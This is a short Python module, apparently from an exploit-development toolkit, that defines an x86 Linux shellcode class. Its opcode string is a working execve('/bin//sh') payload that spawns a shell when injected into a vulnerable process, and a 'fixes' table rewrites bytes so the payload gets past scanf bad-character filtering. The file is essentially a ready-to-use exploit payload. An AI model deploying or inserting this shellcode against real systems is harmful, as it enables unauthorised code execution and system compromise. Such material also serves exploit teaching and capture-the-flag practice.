#!/usr/bin/python
#
# Shell

from ..shellcode import ShellCode

class x86LinuxShell(ShellCode):
    def __init__(self, args):
        super(x86LinuxShell, self).__init__()

        self.opcodes = (
            "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
            "\xc9\x89\xca\x6a\x0b\x58\xcd\x80")

        self.fixes = {
            # push 0xb; pop eax -> mov al, 0xe; sub al, 0x3; pop eax
            'isoc99_scanf' : ["\x6a\x0b", "\xb0\x0e\x2c\x03"]
        }
